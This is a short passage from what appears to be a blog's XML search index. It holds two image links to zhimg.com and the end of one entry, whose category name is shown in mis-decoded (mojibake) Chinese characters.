<p><img src="https://pic1.zhimg.com/80/v2-d0006553decea872cd9e63bf0d97e810_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-9f8b7b5e3dd5d64b592823edb34689f8_1440w.jpg?source=1940ef5c" alt="img"></p>
]]></content>
      <categories>
        <category>è¦ç»™ç„¶ç„¶å•ç‹¬å¼€ä¸€ä¸ªåˆ†ç±»æ</category>
      </categories>
  </entry>
</search>
